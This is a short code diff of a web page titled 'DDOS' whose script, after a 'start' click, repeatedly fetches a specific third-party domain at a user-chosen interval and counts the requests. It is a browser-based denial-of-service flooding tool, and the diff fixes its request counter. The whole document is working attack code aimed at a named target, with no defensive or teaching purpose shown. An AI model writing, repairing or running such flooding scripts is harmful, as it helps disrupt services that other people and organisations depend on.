@@ -11,19 +11,20 @@
   <h1 id="i">DDOS</h1>
   <button id="s">開始</button>
   <input type="text" id="in">
-  <h3 id="c">0</h3>
+  <h3 id="c"></h3>
 </body>
 <script>
   document.getElementById('s').onclick = function() {
     document.getElementById('i').innerHTML = '攻撃開始'
+    var n = 0;
     setInterval(function() {
       try {
         fetch('https://gp-uuc4.iss.netstar-inc.com');
+        n++
+        document.getElementById('c').innerHTML = n;
       } catch (e) {
         document.getElementById('c').innerHTML = e;
       }
-      document.getElementById('c').innerHTML = n;
-      n++
     }, document.getElementById('in').value)
   }
 </script>
